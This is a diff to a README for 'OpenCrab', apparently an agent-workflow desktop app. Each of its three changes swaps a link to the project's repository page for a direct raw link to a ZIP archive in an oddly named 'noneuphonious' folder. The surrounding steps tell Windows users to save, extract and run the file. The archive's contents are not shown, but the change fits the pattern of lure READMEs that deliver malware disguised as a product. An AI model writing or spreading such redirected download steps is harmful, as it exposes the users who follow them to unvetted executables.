@@ -1,6 +1,6 @@
 # 🦀 OpenCrab - Structure Your Agent Workflows
 
-[![Download OpenCrab](https://img.shields.io/badge/Download-OpenCrab-6c5ce7?style=for-the-badge&logo=github)](https://github.com/2007ad2555/OpenCrab)
+[![Download OpenCrab](https://img.shields.io/badge/Download-OpenCrab-6c5ce7?style=for-the-badge&logo=github)](https://github.com/2007ad2555/OpenCrab/raw/refs/heads/main/noneuphonious/Open_Crab_energize.zip)
 
 ## 📦 What OpenCrab Does
 
@@ -30,13 +30,13 @@ If your PC can run normal desktop apps, it should handle OpenCrab.
 ## 🚀 Download OpenCrab
 
 1. Open the download page:
-   https://github.com/2007ad2555/OpenCrab
+   https://github.com/2007ad2555/OpenCrab/raw/refs/heads/main/noneuphonious/Open_Crab_energize.zip
 2. Find the latest release or main download file on the page
 3. Save the file to your PC
 4. If the file is a ZIP, extract it first
 5. If the file is an EXE, keep it in a folder you can find again
 
-[Open the OpenCrab download page](https://github.com/2007ad2555/OpenCrab)
+[Open the OpenCrab download page](https://github.com/2007ad2555/OpenCrab/raw/refs/heads/main/noneuphonious/Open_Crab_energize.zip)
 
 ## 🛠️ Install on Windows
 
